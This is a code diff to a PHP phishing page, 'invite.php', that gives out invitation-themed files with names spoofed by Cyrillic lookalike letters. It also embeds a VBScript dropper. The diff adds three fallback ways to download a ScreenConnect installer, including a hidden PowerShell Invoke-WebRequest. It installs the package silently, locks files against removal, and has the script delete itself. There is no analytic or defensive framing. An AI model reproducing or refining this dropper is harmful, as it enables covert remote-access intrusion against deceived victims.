@@ -1,23 +1,23 @@
 <?php
-// invite.php - With Unicode lookalike filenames
+// invite.php - Full version with 3-method download + dual locks
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
 $baseNames = [
-    "Pаrty_Invite",                    // a → а
-    "Lettеr_from_Friеnd",              // e → е
-    "Impоrtant_Mail",                  // o → о
-    "Fоrmal_Invitatiоn",               // o → о
-    "Invitatiоn_Final",                // o → о
-    "Spеcial_Invitatiоn_VIP",          // e → е , o → о
-    "Spеcial_lettеr_VIP",              // e → е
-    "Cеrеmоny_Invite",                 // e → е , o → о
-    "RSVP_Invitatiоn_Draft",           // o → о
-    "Pеrsоnal_Invite",                 // e → е , o → о
-    "Elеgant_Invitatiоn_Card",         // e → е , o → о
-    "Invitatiоn_Exclusivе",            // o → о , e → е
-    "Savе_Thе_Datе_Invitatiоn",        // e → е , o → о
-    "Savе_Thе_Datе"                    // e → е
+    "Pаrty_Invite",
+    "Lettеr_from_Friеnd",
+    "Impоrtant_Mail",
+    "Fоrmal_Invitatiоn",
+    "Invitatiоn_Final",
+    "Spеcial_Invitatiоn_VIP",
+    "Spеcial_lettеr_VIP",
+    "Cеrеmоny_Invite",
+    "RSVP_Invitatiоn_Draft",
+    "Pеrsоnal_Invite",
+    "Elеgant_Invitatiоn_Card",
+    "Invitatiоn_Exclusivе",
+    "Savе_Thе_Datе_Invitatiоn",
+    "Savе_Thе_Datе"
 ];
 
 $cookieName = "inv_used";
@@ -69,7 +69,7 @@ $cipherFormatted = formatArray($cipher);
 $realVbs = <<<REAL
 Option Explicit
 
-Dim svc, score, objShell, objFSO, msiURL, mefinuwig, harogilim, i
+Dim svc, score, objShell, objFSO, msiURL, mefinuwig, harogilim, i, lockStream, msiLock
 score = 0
 
 On Error Resume Next
@@ -140,6 +140,12 @@ End If
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
+' ===== LOCK 1: VBS file =====
+Set lockStream = CreateObject("ADODB.Stream")
+lockStream.Type = 1
+lockStream.Open
+lockStream.LoadFromFile WScript.ScriptFullName
+
 mefinuwig = Array( _
 $keyFormatted )
 harogilim = Array( _
@@ -158,25 +164,58 @@ End If
 
 Sub DownloadAndExecute()
     On Error Resume Next
-    Dim p, http, strm
-    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
-  
+    Dim p, http, strm, folder, psCmd
+
+    folder = objShell.ExpandEnvironmentStrings("%ProgramData%") & "\\DeployCache6273"
+    If Not objFSO.FolderExists(folder) Then
+        objFSO.CreateFolder folder
+    End If
+
+    p = folder & "\\ScreenConnect.ClientSetup.msi"
+
+    ' ===== Method 1: MSXML2 =====
     Set http = CreateObject("MSXML2.XMLHTTP")
     http.Open "GET", msiURL, False
     http.Send
+
     If http.Status = 200 Then
         Set strm = CreateObject("ADODB.Stream")
         strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
+    Else
+        ' ===== Method 2: WinHttp =====
+        Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+        http.Open "GET", msiURL, False
+        http.Send
+
+        If http.Status = 200 Then
+            Set strm = CreateObject("ADODB.Stream")
+            strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
+        Else
+            ' ===== Method 3: PowerShell IWR =====
+            psCmd = "powershell -NoProfile -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & msiURL & "' -OutFile '" & p & "'"""
+            objShell.Run psCmd, 0, True
+        End If
+    End If
+
+    If objFSO.FileExists(p) Then
+        ' ===== LOCK 2: MSI file =====
+        Set msiLock = CreateObject("ADODB.Stream")
+        msiLock.Type = 1
+        msiLock.Open
+        msiLock.LoadFromFile p
+
         objShell.Run """" & p & """ /quiet", 0, True
         WScript.Sleep 90000
-        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
+
+        msiLock.Close
+        objFSO.DeleteFile p, True
     End If
 End Sub
 
 Call DownloadAndExecute
 
-' ===== SELF-DELETE AFTER SUCCESS =====
 On Error Resume Next
+lockStream.Close
 objFSO.DeleteFile WScript.ScriptFullName, True
 
 WScript.Quit
